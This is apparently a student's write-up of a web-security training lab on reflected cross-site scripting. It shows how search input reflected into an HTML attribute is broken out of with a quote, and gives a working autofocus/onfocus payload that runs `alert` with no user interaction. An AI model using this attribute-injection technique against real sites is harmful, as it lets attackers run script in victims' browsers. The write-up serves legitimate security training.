---
title: Lab7-Reflected XSS into attribute with angle brackets HTML-encoded
date: 2026-06-20
tags:
  - 
publish: true
draft: false
description: ""
---
---

This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the `alert` function.

---

Explore the application and understand it : 

**Basic understanding**: 
Type of Application: Blogging Platform
Users can add comments for the posts

---

search some random string 

![[Pasted image 20260620183246.png]]

![[Pasted image 20260620183306.png]]


See source code of home page: 

![[Pasted image 20260620183424.png]]

>The `form` calls the GET `/` with parameter `?search=<searchtext>` 

URL : 
```
https://0ab2007e03ee13fd80ed03f400610053.web-security-academy.net/?search=somexyz123
```

See the source code after searching : 
![[Pasted image 20260620183834.png]]

>search text is inserted into the `value` attribute of `<input>` tag

>So it can be possible to break out of the value attribute, lets test if the input is sanitized or encoded

search with special symbols : 
```
some"xyz'123<abc>adsf
```

![[Pasted image 20260620184226.png]]

![[Pasted image 20260620184252.png]]

>The special characters like `>` and `<` are encoded but `'` and `"` are helping to break out of the `value` attribute

### Payload planning: 

Original code: 

```javascript
<input type=text placeholder='Search the blog...' name=search value="some">
```

Break out of `value` attribute : 
>`xyz"` closes the `value` attribute
>`"` remained at the right end, it needs to be closed or ignored or commented

>inject `onfocus="alert('XSS')` -> with one double quotes `"` as opening statement and leave it empty on closing statement, since already the HTML document holds one double quotes `"` 

```javascript
<input type=text placeholder='Search the blog...' name=search value="some" autofocus onfocus="alert('XSS')">
```

#### Payload: 

```javascript
xyz" autofocus onfocus="alert('XSS') 
```

![[Pasted image 20260620185405.png]]

![[Pasted image 20260620185418.png]]

>The XSS is executed 

See the source code now 
![[Pasted image 20260620185503.png]]

The payload is injected as expected and got triggered on `autofocus` `onfocus` event (no user interaction)

---


